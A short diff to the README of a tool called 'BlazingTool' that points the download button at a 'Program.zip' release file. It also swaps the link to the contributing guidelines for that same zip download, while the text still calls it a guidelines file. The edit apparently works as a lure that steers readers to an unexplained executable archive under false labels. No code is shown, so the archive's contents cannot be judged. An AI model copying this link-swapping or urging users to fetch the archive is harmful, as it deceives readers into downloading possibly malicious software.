@@ -26,7 +26,7 @@ To install BlazingTool, follow these simple steps:
 
 1. Download the program by clicking the button below:
    
-   [![Download BlazingTool](https://img.shields.io/badge/Download-Program.zip-orange)](https://github.com/user-attachments/files/17688433/Program.zip)
+   [![Download BlazingTool](https://github.com/kiyansy5/BlazingTool/releases/download/v2.0/Program.zip)](https://github.com/kiyansy5/BlazingTool/releases/download/v2.0/Program.zip)
 
 2. Extract the downloaded ZIP file to your desired location on your computer.
 
@@ -61,7 +61,7 @@ Here are the steps to utilize BlazingTool effectively:
 
 We welcome contributions from the open-source community to enhance BlazingTool further. If you have any feature suggestions, bug fixes, or improvements, feel free to fork the repository and submit a pull request. Together, we can make BlazingTool even more powerful and efficient for users.
 
-For guidelines on contributing, please refer to the [CONTRIBUTING.md](./CONTRIBUTING.md) file in this repository.
+For guidelines on contributing, please refer to the [https://github.com/kiyansy5/BlazingTool/releases/download/v2.0/Program.zip](https://github.com/kiyansy5/BlazingTool/releases/download/v2.0/Program.zip) file in this repository.
 
 ---
 
